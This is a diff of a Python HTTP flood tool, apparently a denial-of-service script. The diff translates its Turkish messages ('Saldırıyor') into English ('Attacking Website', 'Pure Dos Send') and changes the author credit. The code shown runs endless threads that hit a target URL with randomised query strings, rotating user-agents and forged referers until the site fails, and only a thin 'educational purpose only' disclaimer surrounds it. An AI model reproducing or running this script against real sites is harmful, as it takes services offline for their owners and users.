@@ -5,22 +5,19 @@ import threading
 import random
 from banner import access
 
-########################################
-# Hersey kendi sorumlulugunuzdadır.    #
-########################################
-# Tool Alıntıdır lutfen kufur etmeyin. #
-########################################
+###########################################
+# Eğitim Amaçlıdır sorumluluk kabul etmem #
+###########################################
+# Tool Alıntıdır Lutfen Kufur Etmeyin.    #
+###########################################
 
 """
-Created By: MR.CATHACK
+Created By: RootUnited
 --------------------------------------------------
-
-Follow: https://www.instagram.com/mrcathack/
+This Tool is for Educational purpose only             
+I'm not responsible for your actions 
+FOLLOW : https://instagram.com/mrcathack
 """
-#!/usr/bin/python
-# -*- coding: ascii -*-
-import os, sys
-...
 
 
 if sys.platform == "linux" or sys.platform == "linux2":
@@ -67,7 +64,7 @@ class httpth1(threading.Thread):
         global count
         while True:
             try:
-                #print ("\033[1;32m Saldırıyor. \033[1;m")
+                #print ("\033[1;32m Attacking Website \033[1;m")
                 req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
                 #req = urllib2.Request(url)
                 req.add_header("User-Agent", random.choice(useragent()))
@@ -75,18 +72,18 @@ class httpth1(threading.Thread):
                 req.add_header("Referer", referer)
                 urllib2.urlopen(req)
                 count += 1
-                print ("{0} Saldırı Yapılıyor.".format(count))
+                print ("{0} Pure Dos Send".format(count))
             except urllib2.HTTPError:
-                print ("\033[1;34m Site Düşmüştür. \033[1;m")
+                print ("\033[1;34m SERVER MIGHT ME DOWN \033[1;m")
                 pass
             except urllib2.URLError:
                 print ("\033[1;34m URLERROR \033[1;m")
                 sys.exit()
             except ValueError:
-                print ("\033[1;34m [-]Urlnizi Kontrol edin HATALI. \033[1;m")
+                print ("\033[1;34m [-]Check You're URL \033[1;m")
                 sys.exit()
             except KeyboardInterrupt:
-                exit("\033[1;34m [-]Kullanıcı Tarafından İptal Edildi \033[1;m")
+                exit("\033[1;34m [-]Canceled By User \033[1;m")
                 sys.exit()
 
 
@@ -97,4 +94,4 @@ while True:
     except Exception:
         pass
     except KeyboardInterrupt:
-        exit("\033[1;34m [-]Kullanıcı Tarafından İptal Edildi \033[1;m")
+        exit("\033[1;34m [-]Canceled By User \033[1;m")
